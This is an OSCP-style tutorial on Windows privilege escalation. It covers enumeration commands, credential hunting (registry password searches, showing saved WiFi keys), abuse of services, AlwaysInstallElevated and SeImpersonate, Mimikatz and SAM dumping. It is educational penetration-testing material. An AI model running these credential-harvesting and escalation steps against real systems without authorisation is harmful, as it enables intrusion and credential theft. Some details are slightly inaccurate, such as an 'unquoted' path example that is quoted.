# 📘 Windows Privilege Escalation (OSCP Guide)

## **Chapter 1: Introduction to Privilege Escalation**

* **What is Privilege Escalation?**
  → When you hack into a system, you usually don’t start as an admin. You might have a **low-privilege user**. Privilege escalation means finding a way to become **Administrator / SYSTEM (highest privilege)**.
  → Think: “I got in, but now I want full control.”

* **Why is it important for OSCP?**

  * Most OSCP boxes require privesc.
  * Without it, you can’t dump hashes, access protected files, or get persistence.

* **Two types of Privilege Escalation:**

  1. **Vertical** → From low privilege (User) to high privilege (Admin/SYSTEM).
  2. **Horizontal** → Staying at the same level, but accessing other users’ data.

* **Mindset**: After getting initial access, always ask:

  * Who am I? (`whoami`)
  * What can I do? (`whoami /priv`)
  * Where am I? (`systeminfo`)
  * What is running? (`tasklist`)

---

## **Chapter 2: Windows Basics (OSCP Needed Only)**

Before escalation, understand some **Windows fundamentals**:

1. **Windows Accounts:**

   * **Administrator** → full control.
   * **SYSTEM** → even higher than admin, used by services.
   * **Users** → normal accounts with limited rights.

2. **Security Identifiers (SID):** Unique ID for each user. Example: `S-1-5-21-...-500` → Admin account.

3. **Important Files:**

   * `C:\Windows\System32\config\SAM` → stores user hashes.
   * `C:\Windows\System32\config\SYSTEM` → system secrets.
   * `C:\Users\` → user profiles, desktop files, creds.

4. **Windows Services:**

   * Background programs (like Linux daemons).
   * Run as SYSTEM or user. If misconfigured, they can be abused.

---

## **Chapter 3: Enumeration (The Key Step)**

Before exploiting, you **enumerate** the machine for misconfigurations.
👉 Tools to use:

* **Manual commands:**

  * `systeminfo` → OS version, hotfixes, architecture.
  * `whoami /priv` → check privileges.
  * `net user` → list users.
  * `tasklist /svc` → running services.
  * `wmic qfe` → list installed patches.
  * `icacls <file>` → check file permissions.

* **Automated scripts:**

  * `winPEAS.exe` → all-in-one enumeration.
  * `Seatbelt` → security checks.
  * `PowerUp.ps1` → PowerShell privilege escalation checks.

💡 OSCP tip: Run **winPEAS**, but also try **manual commands** because sometimes automation misses things.

---

## **Chapter 4: Common Privilege Escalation Techniques**

Here’s the **core** section you’ll use in OSCP.

### 1. **Kernel Exploits (Windows Version-based)**

* If the system is missing patches, you can use public exploits.
* Example:

  * `MS16-032` (Windows 7/8 Local Priv Esc).
  * `MS10-015` (older versions).
* Steps:

  1. Find OS version → `systeminfo`.
  2. Compare with exploit list (e.g., [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)).
  3. Compile & run exploit.

👉 Risk: Might crash the system. Use carefully.

---

### 2. **Unquoted Service Path**

* Some Windows services are started using unquoted paths:
  Example: `"C:\Program Files\My Service\service.exe"`
  If it’s unquoted, Windows may try:

  * `C:\Program.exe`
  * `C:\Program Files\My.exe`

👉 If you can place a malicious `.exe` in `C:\`, you can hijack the service.
Commands:

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "Auto"
```

---

### 3. **Weak Service Permissions**

* Some services allow normal users to **modify service configuration**.
* Abuse: Replace the binary with your reverse shell.
  Command:

```powershell
sc qc <service_name>
accesschk64.exe -uwcqv <username> <service_name>
```

---

### 4. **AlwaysInstallElevated (MSI Abuse)**

* If this policy is enabled, any `.msi` package runs as SYSTEM.
  Check:

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

* If both are `1` → Jackpot 🎯
* Create malicious `.msi` with `msfvenom`.

---

### 5. **Credential Hunting**

* Search for passwords in:

  * `C:\Users\<user>\Desktop\`
  * `C:\Windows\Panther\Unattend.xml`
  * Registry (`reg query HKLM /f password /t REG_SZ /s`)
  * Saved WiFi creds (`netsh wlan show profile name=<SSID> key=clear`)

---

### 6. **DLL Hijacking**

* Some apps load DLLs from insecure locations.
* If you drop a malicious DLL, you can escalate.
  Check tools like `ProcMon` for missing DLLs.

---

### 7. **Scheduled Tasks**

* Check scheduled tasks:

  ```powershell
  schtasks /query /fo LIST /v
  ```
* If writable by user → replace binary.

---

### 8. **Privileges Abuse**

* If you have special privileges (`whoami /priv`):

  * `SeImpersonatePrivilege` → JuicyPotato / PrintSpoofer exploit.
  * `SeBackupPrivilege` → Read SAM file.
  * `SeDebugPrivilege` → Inject into processes.

---

## **Chapter 5: Advanced Tricks**

* **Token Impersonation** → Abuse high-privilege tokens in memory.
* **Pass-the-Hash** → Use stolen NTLM hashes instead of passwords.
* **Mimikatz** → Dump credentials from memory.
* **PrintSpoofer** → Abuse `SeImpersonatePrivilege` on modern Windows.
* **UAC Bypass** → Escalate from Administrator to SYSTEM.

---

## **Chapter 6: Practice Strategy (For OSCP)**

1. **Always start with enumeration.**

   * Run `winPEAS` + manual checks.

2. **Check Windows version.**

   * If old → kernel exploit.
   * If patched → misconfigurations.

3. **Check services and permissions.**

   * Unquoted paths, weak ACLs.

4. **Check registry + files for creds.**

5. **Check privileges.**

   * If `SeImpersonatePrivilege` → PrintSpoofer.

---

## **Chapter 7: Cheat Sheet for Exam**

* **Commands to always run first:**

  ```powershell
  whoami
  whoami /priv
  systeminfo
  net user
  ipconfig /all
  tasklist /svc
  wmic qfe
  ```

* **Tools to upload:**

  * `winPEAS.exe`
  * `accesschk.exe`
  * `PowerUp.ps1`
  * `PrintSpoofer.exe`

---

## **Chapter 8: Resources & Practice Labs**

* **HackTheBox (Windows machines)**: Optimum, Bastard, Blue, Active.
* **VulnHub Windows VMs**: e.g., Kioptrix Windows.
* **Privilege Escalation Playground:**

  * TryHackMe → “Windows PrivEsc Arena”.
  * Local VMs with old Windows.

---

# 📘 Chapter 1: Introduction to Privilege Escalation (Deep Explanation)

---

## 1. **What is Privilege Escalation?**

👉 Imagine you break into a Windows machine during OSCP:

* You got a **reverse shell** but only as a **normal user** (like `bob`).
* As `bob`, you can’t do much:

  * Can’t access `C:\Windows\System32\config\SAM` (where hashes live).
  * Can’t install drivers.
  * Can’t read admin’s files.

💡 Your goal = **become SYSTEM** (the most powerful account).

* SYSTEM > Administrator > Normal User.

---

## 2. **Why is Privilege Escalation Needed in OSCP?**

* OSCP exam boxes are often designed so:

  * Step 1: Initial foothold (web exploit, weak creds, etc.) → low-priv shell.
  * Step 2: Privilege escalation → admin/SYSTEM.
* Without escalation, you **won’t get root.txt (flag)** → no points.

Think of privesc as **“second stage of hacking.”**

---

## 3. **Types of Privilege Escalation**

1. **Vertical PrivEsc** → Go higher (User → Admin → SYSTEM).
   Example: Exploit weak service to run as SYSTEM.
2. **Horizontal PrivEsc** → Stay at same level but switch users.
   Example: You are `bob`, but you read `alice`’s files.

👉 In OSCP, vertical privesc is the main focus.

---

## 4. **Mindset for Privilege Escalation**

When you land on a Windows box, **always slow down and ask:**

1. **Who am I?**

   * `whoami`
   * `echo %username%`

2. **What am I allowed to do?**

   * `whoami /priv` → lists privileges like `SeImpersonatePrivilege`.

3. **Where am I?**

   * `systeminfo` → OS version, architecture (x86 or x64).
   * Helps decide kernel exploits.

4. **What is running?**

   * `tasklist /svc` → running services.
   * Maybe one is misconfigured.

5. **What’s installed?**

   * `wmic product get name,version`
   * Old apps may have known exploits.

💡 This is like detective work. You gather info → then pick the right attack.

---

## 5. **Privilege Escalation Categories**

You’ll explore them deeply in later chapters, but here’s the roadmap:

1. **Kernel Exploits** (missing patches).
2. **Service Exploits** (unquoted paths, weak permissions).
3. **Misconfigurations** (AlwaysInstallElevated, registry).
4. **Credentials Hunting** (in files, registry, memory).
5. **Privilege Abuse** (special privileges → SeImpersonate, SeBackup).
6. **Scheduled Tasks** (replace writable binary).

---

## 6. **What to Practice in Chapter 1**

Since you’re just starting, **practice the basics of enumeration**.
👉 Don’t jump into exploits yet. Just learn to “see the machine.”

### 📝 Practical Tasks

1. **Set up a Windows VM** (Windows 7 or 10 vulnerable build).

   * You can use VulnHub/THM/HTB boxes or create your own.

2. **Get a low-priv shell** (even local login is fine for practice).

3. **Run these commands & write down outputs:**

   ```powershell
   whoami
   whoami /priv
   systeminfo
   net user
   net localgroup administrators
   tasklist /svc
   wmic qfe
   ```

4. **Install & run winPEAS.exe**

   * See what info it collects. Compare with manual commands.

5. **Build a notebook (or Excel sheet):**

   * Column 1: Command.
   * Column 2: Output meaning.
   * Column 3: Possible privesc ideas.

---

## 7. **Mini Practice Example**

Imagine you run:

```
whoami → bob  
whoami /priv → SeImpersonatePrivilege: Enabled  
systeminfo → Windows 10, Build 1809  
```

* This tells you:

  * You’re a low-priv user (`bob`).
  * You have `SeImpersonatePrivilege` (powerful).
  * OS is 1809 (so maybe PrintSpoofer exploit works).

👉 Already you see a path → PrintSpoofer (but that’s for later chapters).

---

## 8. **How to Build Skills (Beginner → Advanced)**

1. **Week 1:** Only practice enumeration → get comfortable with commands.
2. **Week 2:** Understand different privilege escalation paths (service misconfigs, AlwaysInstallElevated, etc.).
3. **Week 3–4:** Combine enumeration → exploit → escalation.
4. **After 1 month:** You’ll be able to land on *any Windows box*, and think:
   “Okay, I know what to check first, then second, then third.”

---

✅ So, Chapter 1 is all about:

* Understanding what privesc is.
* Why OSCP requires it.
* Building the **right mindset**.
* Practicing **enumeration only** (no exploits yet).

---


# 📘 **Chapter 2 – Windows Basics (For Privilege Escalation)**

---

## ✅ **What You Will Learn in This Chapter**

1. Why understanding Windows is important for privilege escalation.
2. Windows account types and their role in attacks.
3. Security Identifiers (SID) and why they matter.
4. Important files, directories, and how attackers abuse them.
5. Windows Services – how they work and how to exploit them.
6. Windows Registry – structure and how misconfigurations help escalation.
7. File and folder permissions – how to find weak spots.
8. Event logs – gathering intelligence.
9. Networking – what to look for when enumerating.
10. Hands-on practice ideas.

---

## ➤ **Section 1 – Why Learn Windows Internals for Privilege Escalation?**

In privilege escalation, attackers rely on **misconfigurations, vulnerabilities, or insecure setups** within Windows. If you understand how Windows works — its accounts, files, permissions, and services — you’ll be able to:

✔ Spot misconfigurations faster
✔ Know where sensitive files are stored
✔ Find services running with high privileges
✔ Identify registry keys that weaken the system
✔ Access critical files (like SAM)
✔ Use built-in features (like scheduled tasks or MSI installation) to escalate

Without this knowledge, you might blindly run scripts without understanding why they work or how to exploit something manually.

---

## ➤ **Section 2 – Windows Account Types**

| Account Type     | Where Used              | Description                       | Attack Angle                                                |
| ---------------- | ----------------------- | --------------------------------- | ----------------------------------------------------------- |
| SYSTEM           | OS core, services       | Highest access level              | Exploitable through misconfigured services or impersonation |
| Administrator    | User with full access   | Can install apps, change settings | Target for attacks like token impersonation, pass-the-hash  |
| Standard User    | Normal user account     | Limited access                    | Starting point for attacks                                  |
| Guest            | Temporary, restricted   | Very limited                      | Rarely exploitable but sometimes misconfigured              |
| Service Accounts | Runs processes, daemons | Sometimes configured insecurely   | Privilege escalation through abuse                          |

---

### ✅ **Key Points**

* SYSTEM has complete control and is often the target after exploiting services.
* Administrator is powerful but can be escalated if token impersonation or misconfigurations exist.
* Regular users are the most common initial foothold — need escalation to gain access.
* Service accounts might have unnecessary privileges — always enumerate.

---

## ➤ **Section 3 – Security Identifiers (SID)**

Every user and group has a unique identifier called SID.

Example:

```
S-1-5-21-3623811015-3361044348-30300820-500
```

Where:

* `S-1-5-21-...` → identifies the domain or computer.
* `500` → special identifier meaning the built-in Administrator account.

### Why this matters:

* Some scripts or attacks look for SID endings like `-500` → Administrator.
* Knowing how SIDs are structured helps in crafting attacks or impersonations.

---

## ➤ **Section 4 – Important Windows Files and Directories**

### ✅ **SAM (Security Accounts Manager)**

* Location:
  `C:\Windows\System32\config\SAM`
* Stores hashed passwords for local users.
* Can be dumped using tools like `mimikatz` or by abusing backup privileges.

### ✅ **SYSTEM**

* Location:
  `C:\Windows\System32\config\SYSTEM`
* Contains system configurations and secrets.

### ✅ **LSASS (Local Security Authority Subsystem Service)**

* Handles authentication.
* Credentials are stored in memory and can be extracted.

### ✅ **User Profiles**

* Location:
  `C:\Users\<username>\`
* Contains desktop files, documents, saved passwords.

### ✅ **Unattend.xml**

* Location:
  `C:\Windows\Panther\Unattend.xml`
* Contains system setup information, sometimes credentials.

---

## ➤ **Section 5 – Windows Services**

Windows services are programs that run in the background. They often run with SYSTEM privileges and can be abused if misconfigured.

### ✅ **How Services Work**

* Each service has:

  * A name and description.
  * A binary path (executable location).
  * Startup type (automatic/manual).
  * User account it runs as (often SYSTEM).

### ✅ **Common Privilege Escalation Issues**

1. **Unquoted Service Path**

   * If the executable path contains spaces and isn’t quoted, Windows may execute attacker’s binary.

2. **Weak Permissions**

   * If any user can modify the service configuration → hijack possible.

3. **Always Running as SYSTEM**

   * Services running as SYSTEM can be abused through misconfigurations.

### ✅ **Commands to Enumerate**

```powershell
sc qc <service_name>
tasklist /svc
```

---

## ➤ **Section 6 – Windows Registry**

The registry stores system and application configurations.

### ✅ **Common Locations for Privilege Escalation**

* `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

  * Contains AlwaysInstallElevated setting.

* `HKLM\SYSTEM\CurrentControlSet\Services\<service_name>`

  * Contains service configurations.

* `HKCU\Software`

  * Stores current user’s preferences, sometimes passwords.

---

### ✅ **Misconfiguration Example**

If both `HKCU` and `HKLM` AlwaysInstallElevated are enabled (`1`), any `.msi` file runs with SYSTEM privileges → full escalation.

---

## ➤ **Section 7 – File and Folder Permissions**

Permissions decide who can read, write, or execute files.

### ✅ **Commands**

```powershell
icacls C:\Users
icacls "C:\Program Files"
```

Look for:

* Writable folders by users → attackers can place files.
* Sensitive files accessible by non-admin users.

### ✅ **Why This Matters**

Attackers can replace executables, modify scripts, or steal data if permissions are weak.

---

## ➤ **Section 8 – Windows Event Logs**

Logs can help attackers find patterns or credentials.

### ✅ **Common Logs**

* Security → login attempts.
* Application → software errors.
* System → hardware events, driver failures.

### ✅ **Commands**

```powershell
wevtutil qe Security /c:5 /f:text
```

Sometimes credentials, commands, or useful errors are found here.

---

## ➤ **Section 9 – Networking Info for Enumeration**

Attackers need network details to plan lateral movement or privilege escalation.

### ✅ **Useful Commands**

```powershell
ipconfig /all
netstat -ano
```

Check:

* Active connections.
* Listening ports.
* Interfaces and gateways.
* Services exposing ports.

---

## ➤ **Section 10 – Practical Exercises**

### ✅ **Exercise 1 – Identify Account Types**

* Run `net user` and `net localgroup administrators`.
* List which accounts have admin rights.

### ✅ **Exercise 2 – Explore the File System**

* Navigate `C:\Windows\System32\config\`.
* Try accessing `SAM` → it should fail unless escalated.
* Explore `C:\Users\` → look for documents, desktop files.

### ✅ **Exercise 3 – Service Enumeration**

* Run `tasklist /svc` → note services running as SYSTEM.
* Check unquoted paths using `sc qc <service>`.

### ✅ **Exercise 4 – Registry Check**

* Run:

  ```powershell
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```
* See if AlwaysInstallElevated is set to 1.

### ✅ **Exercise 5 – Permission Enumeration**

* Run `icacls` on sensitive folders.
* Look for writable paths.

### ✅ **Exercise 6 – Event Logs**

* Run `wevtutil` to check recent security logs.
* Try to understand if there are failed login attempts or errors.

---

## ➤ **Section 11 – Real-Life Scenario Example**

You access a box as `bob`. You run:

```powershell
whoami
# bob

whoami /priv
# SeChangeNotifyPrivilege Enabled
# SeImpersonatePrivilege Enabled

systeminfo
# Windows 10 Build 17763

net user
# Administrator
# Guest
# bob

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 0x1
```

**Analysis:**

* SYSTEM-level services running → possible target.
* AlwaysInstallElevated enabled → MSI exploitation opportunity.
* SeImpersonatePrivilege → impersonation attacks possible.

You now know where to focus your next steps → escalate privileges confidently.

---

## ➤ **Section 12 – Summary**

✔ Windows account types define attack surfaces.
✔ SYSTEM is the most powerful account → services running under it are exploitable.
✔ Important files like SAM and SYSTEM hold sensitive information → privilege escalation aims to access them.
✔ Registry settings like AlwaysInstallElevated can be abused for escalation.
✔ File and folder permissions can give attackers an entry point if writable.
✔ Event logs may hold useful information.
✔ Networking details help identify attack vectors.
✔ Manual enumeration with commands teaches you how the system works and what’s vulnerable.

This chapter gives you the **knowledge and tools** you need to start identifying privilege escalation paths on any Windows machine.

---



# 📘 **Chapter 3 – Windows Enumeration in Depth**

---

## ✅ **What You Will Learn in This Chapter**

1. Why enumeration is crucial.
2. Manual enumeration – commands you must practice.
3. Automated tools – when and how to use them.
4. What specific things to look for in every category.
5. Interpreting outputs for privilege escalation.
6. Organizing your enumeration findings.
7. Practice scenarios and examples.

---

## ➤ **Section 1 – Why Enumeration Matters**

You can’t exploit what you haven’t discovered. Enumeration is the process of discovering:

✔ OS version
✔ Installed patches
✔ Running services
✔ User accounts
✔ Privileges
✔ File permissions
✔ Scheduled tasks
✔ Network settings

Without enumeration, you might miss the easiest path to escalate privileges or crash the system by blindly exploiting.

---

## ➤ **Section 2 – Categories of Enumeration**

When enumerating a Windows system, break it down into these sections:

1. **System Info & OS Details**
2. **Users & Groups**
3. **Privileges**
4. **Services & Drivers**
5. **Scheduled Tasks**
6. **File Permissions**
7. **Registry Settings**
8. **Installed Software & Patches**
9. **Network Configuration**
10. **Credential Storage**
11. **Environment Variables & Configuration Files**

For each section, I’ll explain:

* Commands/tools.
* What output means.
* What to look for.

---

## ➤ **Section 3 – Manual Enumeration Commands & What to Look For**

---

### ✅ **1. System Info & OS Version**

Commands:

```powershell
systeminfo
```

**What to look for:**

* **OS Name & Version** → Is it outdated? Can you use kernel exploits?
* **System Type (x86/x64)** → Helps choose correct exploit.
* **Hotfixes / KB updates** → Missing patches → exploit opportunity.
* **Original Install Date** → Old machines → poorly maintained.

---

### ✅ **2. Users & Groups**

Commands:

```powershell
net user
net localgroup administrators
```

**What to look for:**

* Is there an `Administrator` account?
* Are other accounts weak or default?
* Are you already in the `Administrators` group?
* Are there other service accounts that run critical processes?

---

### ✅ **3. Privileges**

Commands:

```powershell
whoami /priv
```

**What to look for:**

* `SeImpersonatePrivilege` → Can impersonate other accounts → exploit with tools.
* `SeDebugPrivilege` → Debug system processes → privilege abuse possible.
* `SeBackupPrivilege` → Read files like SAM → dump credentials.

---

### ✅ **4. Services & Drivers**

Commands:

```powershell
tasklist /svc
wmic service get name,displayname,pathname,startmode,state
```

**What to look for:**

* Services running as SYSTEM → potential escalation targets.
* Services with `Auto` start → can be abused during boot.
* Misconfigured paths → unquoted service paths → path hijacking.

---

### ✅ **5. Scheduled Tasks**

Commands:

```powershell
schtasks /query /fo LIST /v
```

**What to look for:**

* Tasks that run as SYSTEM.
* Tasks with weak permissions → you can overwrite scripts.
* Tasks pointing to writable directories → hijack path.

---

### ✅ **6. File Permissions**

Commands:

```powershell
icacls C:\Users
icacls "C:\Program Files"
icacls <specific file>
```

**What to look for:**

* Files/directories with `Everyone: Full Control`.
* Writable folders → plant malicious binaries.
* Sensitive files readable by low-priv users.

---

### ✅ **7. Registry Settings**

Commands:

```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f Install /s
```

**What to look for:**

* Stored credentials in plaintext.
* Installer settings like `AlwaysInstallElevated`.
* Services configuration → paths, permissions.

---

### ✅ **8. Installed Software & Patches**

Commands:

```powershell
wmic qfe list
wmic product get name,version
```

**What to look for:**

* Missing critical updates → kernel exploit candidate.
* Outdated software → known vulnerabilities.

---

### ✅ **9. Network Configuration**

Commands:

```powershell
ipconfig /all
route print
netstat -ano
```

**What to look for:**

* Open ports → services you might abuse.
* Listening applications → potential backdoors.
* Routing info → internal network topology.

---

### ✅ **10. Credential Storage**

Commands:

```powershell
cmdkey /list
netsh wlan show profiles
```

**What to look for:**

* Saved WiFi passwords → lateral movement.
* Stored credentials → abuse.

---

### ✅ **11. Environment Variables & Config Files**

Commands:

```powershell
set
type C:\Users\<user>\Documents\config.ini
```

**What to look for:**

* Paths to tools, scripts.
* Hardcoded passwords.
* Misconfigured settings.

---

## ➤ **Section 4 – Automated Tools for Enumeration**

---

### ✅ **winPEAS.exe**

* Most popular enumeration tool.
* Checks everything from users to patches.
* Generates a report showing:

  * Weak permissions.
  * Missing patches.
  * Stored credentials.
  * Running services.

---

### ✅ **Seatbelt.exe**

* Focuses on security posture.
* Helps identify exploitable paths.

---

### ✅ **PowerUp.ps1**

* PowerShell script focusing on privilege escalation checks.
* Checks:

  * Services.
  * Registry.
  * AlwaysInstallElevated.
  * Stored credentials.

---

### ✅ **AccessChk.exe**

* Tool to check permissions on files and services.

---

## ➤ **Section 5 – What to Look for in Each Output**

| Output          | What to look for                         | Why it matters          |
| --------------- | ---------------------------------------- | ----------------------- |
| `systeminfo`    | Missing patches, outdated OS             | Kernel exploit possible |
| `net user`      | Weak or default accounts                 | Credential abuse        |
| `whoami /priv`  | SeImpersonatePrivilege, SeDebugPrivilege | Privilege abuse         |
| `tasklist /svc` | SYSTEM services, vulnerable apps         | Service exploitation    |
| `schtasks`      | Writable or SYSTEM tasks                 | Hijack scripts          |
| `icacls`        | Writable files/folders                   | File-based exploits     |
| `reg query`     | Stored passwords, installer settings     | Direct escalation       |
| `wmic qfe`      | Missing updates                          | Exploitation            |
| `netsh wlan`    | Saved networks                           | Attack path extension   |

---

## ➤ **Section 6 – How to Organize Enumeration Findings**

Create a structured document while enumerating:

### Example format:

| Category   | Command       | Output Summary                           | Possible Exploit         |
| ---------- | ------------- | ---------------------------------------- | ------------------------ |
| OS         | systeminfo    | Windows 10 Build 1809, no recent patches | Kernel exploit possible  |
| Users      | net user      | Administrator exists                     | Target admin credentials |
| Privileges | whoami /priv  | SeImpersonatePrivilege enabled           | Use PrintSpoofer         |
| Services   | tasklist /svc | `VulnerableService` running as SYSTEM    | Unquoted path abuse      |

This helps you prioritize attacks during exams.

---

## ➤ **Section 7 – Practice Checklist**

✅ Run each command.
✅ Save outputs to a text file or notebook.
✅ Highlight dangerous findings.
✅ Cross-reference with known exploits.
✅ Re-run after privilege escalation to confirm success.

---

## ➤ **Section 8 – Example Scenario**

---

**System Setup:**

* Windows 10 Build 1809
* No security patches for 2 years
* User account `bob`, with SeImpersonatePrivilege enabled
* A service `VulnerableService` running as SYSTEM
* `C:\Program Files\Vulnerable Service\service.exe` → unquoted path

---

**Steps Taken:**

1. Run `systeminfo` → confirms old OS → possible kernel exploit.
2. Run `whoami /priv` → shows `SeImpersonatePrivilege` → exploitable.
3. Run `tasklist /svc` → finds service running as SYSTEM.
4. Run `icacls "C:\Program Files\Vulnerable Service"` → writable → path hijack possible.

---

**Conclusion:**
You can either abuse impersonation privileges or hijack the service using writable paths → escalate to SYSTEM.

---

## ➤ **Section 9 – Best Practices for Enumeration**

✔ Run both manual and automated tools.
✔ Don’t rush — understand the outputs.
✔ Document everything — exam time is stressful.
✔ Compare outputs with known vulnerabilities.
✔ Use privilege enumeration as your roadmap, not just a checklist.

---

## ➤ **Section 10 – Summary of Chapter 2**

You’ve now learned:

✔ Why enumeration is the backbone of privilege escalation.
✔ The categories of information to gather.
✔ Manual commands and what each output means.
✔ Tools like `winPEAS`, `Seatbelt`, and `PowerUp.ps1`.
✔ How to interpret findings and spot privilege escalation opportunities.
✔ How to organize data for practical use.
✔ Real-life examples and hands-on exercises.


---

 📘 **Chapter 3.1 – Enumeration (The Key Step)**

---

## ✅ **What You Will Learn in This Chapter**

1. What is enumeration and why it's critical for privilege escalation.
2. The mindset you should adopt during enumeration.
3. Categories of enumeration.
4. Manual enumeration commands – step by step.
5. Automated enumeration tools and when to use them.
6. How to interpret results and identify attack vectors.
7. Real-world examples.
8. Best practices and mistakes to avoid.
9. Exercises to sharpen your enumeration skills.

---

## ➤ **Section 1 – What Is Enumeration?**

Enumeration is the process of **gathering information** from the target machine to find weaknesses, misconfigurations, or vulnerable services that you can exploit to escalate privileges.

In privilege escalation, enumeration helps you:

✔ Know who you are and what permissions you have.
✔ Discover services running with SYSTEM rights.
✔ Check installed patches or software versions.
✔ Find registry keys or files with sensitive information.
✔ Locate writable directories or tasks that can be hijacked.
✔ Plan your attack safely without crashing the system.

---

## ➤ **Section 2 – Why Enumeration Is Critical**

* It helps you avoid blindly running exploits.
* It identifies paths that others may miss.
* It reveals overlooked misconfigurations like writable folders or old patches.
* It gives you a structured approach — explore, analyze, then exploit.

In OSCP, **enumeration skills separate average hackers from professionals**. If you know how to interpret outputs, you’ll escalate faster and more effectively.

---

## ➤ **Section 3 – Enumeration Mindset**

When you access a Windows machine, always ask:

1. **Who am I?**

   * Find your account type and privileges.

2. **What can I access?**

   * Permissions, files, registry entries.

3. **What is running?**

   * Services, processes, tasks.

4. **What is missing or outdated?**

   * Software versions, patches.

5. **What opportunities exist?**

   * Writable folders, misconfigured services, scheduled tasks.

6. **What attack path is safest?**

   * Avoid brute forcing; exploit configurations or privileges.

Write everything down while enumerating — even small details like group membership can open escalation paths.

---

## ➤ **Section 4 – Categories of Enumeration**

| Category          | Purpose                                       | Commands / Tools                       |
| ----------------- | --------------------------------------------- | -------------------------------------- |
| User & Group Info | Know users, admins, group memberships         | `whoami`, `net user`, `net localgroup` |
| Privileges        | See your permissions                          | `whoami /priv`                         |
| OS & Patch Info   | Identify version, missing patches             | `systeminfo`, `wmic qfe`               |
| Services          | Find running services & misconfigs            | `tasklist /svc`, `sc qc`               |
| Registry          | Check for settings like AlwaysInstallElevated | `reg query`                            |
| Files & Folders   | Permissions, writable directories             | `icacls`                               |
| Scheduled Tasks   | Find tasks that can be abused                 | `schtasks`                             |
| Event Logs        | Find hints, credentials, errors               | `wevtutil`                             |
| Network Info      | Open ports, interfaces, routes                | `ipconfig`, `netstat`                  |

---

## ➤ **Section 5 – Manual Enumeration Commands Explained**

### ✅ **1. Who Am I**

```powershell
whoami
```

* Outputs the current user account.
* Helps determine if you’re a standard user or admin.

```powershell
echo %username%
```

* Alternative to find the username.

---

### ✅ **2. Privileges**

```powershell
whoami /priv
```

* Shows privileges enabled or disabled.
* Look for:

  * `SeDebugPrivilege`: Debug processes.
  * `SeImpersonatePrivilege`: Act as another user.
  * `SeBackupPrivilege`: Read sensitive files.
  * `SeRestorePrivilege`: Restore files.

---

### ✅ **3. OS and Patch Information**

```powershell
systeminfo
```

* Gives:

  * OS name
  * Build version
  * Architecture (x86/x64)
  * Installed patches
    Use this to find kernel exploit possibilities.

```powershell
wmic qfe
```

* Lists installed Windows updates (patches).
* Compare missing patches against exploit databases.

---

### ✅ **4. User and Group Enumeration**

```powershell
net user
```

* Lists all user accounts.

```powershell
net localgroup administrators
```

* Shows members of the admin group → check if your account is present.

---

### ✅ **5. Services Enumeration**

```powershell
tasklist /svc
```

* Lists running services and their associated processes.

```powershell
sc qc <service_name>
```

* Shows service configuration:

  * Path
  * User account
  * Start mode
    Look for SYSTEM services and unquoted paths.

---

### ✅ **6. Registry Enumeration**

Check AlwaysInstallElevated:

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

* If both return `1`, MSI files run as SYSTEM → huge escalation path.

---

### ✅ **7. File and Folder Permissions**

```powershell
icacls C:\Users
icacls "C:\Program Files"
```

* Shows which users can read/write files and folders.
* Writable folders can be exploited.

---

### ✅ **8. Scheduled Tasks**

```powershell
schtasks /query /fo LIST /v
```

* Lists scheduled tasks with details:

  * Name
  * Run as
  * Path
    Writable tasks or SYSTEM tasks can be hijacked.

---

### ✅ **9. Event Logs**

```powershell
wevtutil qe Security /c:5 /f:text
```

* Queries the last 5 security events.
* May reveal failed login attempts, errors, or commands.

---

### ✅ **10. Network Enumeration**

```powershell
ipconfig /all
netstat -ano
```

* Reveals open ports, active connections, and interfaces.

---

## ➤ **Section 6 – Automated Tools for Enumeration**

### ✅ **winPEAS.exe**

* A powerful enumeration tool.
* Finds misconfigurations, services, registry flaws, weak permissions, and more.
* Use it alongside manual enumeration — never rely on it completely.

### ✅ **PowerUp.ps1**

* A PowerShell script that scans for privilege escalation opportunities.

### ✅ **Seatbelt.exe**

* A lightweight tool that focuses on security checks, user info, and configurations.

### ✅ **Accesschk.exe**

* Checks permissions of files, folders, and services in detail.

---

## ➤ **Section 7 – How to Interpret Enumeration Results**

### Example Output – `whoami /priv`

```
SeChangeNotifyPrivilege    Enabled
SeImpersonatePrivilege    Enabled
SeBackupPrivilege         Disabled
...
```

→ Enabled impersonation privilege → PrintSpoofer or token abuse possible.

---

### Example Output – `systeminfo`

```
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.17763
System Type:               x64-based PC
Hotfixes:                  KB123456, KB987654
```

→ OS version → check if exploits for 17763 exist.
→ Installed patches → missing patches → kernel exploit likely.

---

### Example Output – `sc qc <service>`

```
SERVICE_NAME: MyService
DISPLAY_NAME: MyService
BINARY_PATH_NAME: C:\Program Files\MyService\service.exe
START_TYPE: Auto Start
SERVICE_START_NAME: LocalSystem
```

→ Runs as SYSTEM → potential abuse.
→ Path may be unquoted → attacker can hijack it.

---

### Example Output – `reg query AlwaysInstallElevated`

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

→ Enabled → MSI escalation opportunity.

---

### Example Output – `icacls`

```
C:\Users\Public Everyone:(F)
```

→ Folder writable by all users → can plant malicious files.

---

## ➤ **Section 8 – Real-World Enumeration Scenario**

You land on a Windows box and perform these commands:

```powershell
whoami
# bob

whoami /priv
# SeChangeNotifyPrivilege Enabled
# SeImpersonatePrivilege Enabled

systeminfo
# Windows 10, Build 17763, missing patches

tasklist /svc
# Service "PrintSpooler" running as SYSTEM

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 0x0

schtasks /query /fo LIST /v
# Task "BackupTask" writable by bob

icacls C:\Users\Public
# Everyone:(F)
```

**Analysis:**
✔ You’re a normal user (`bob`).
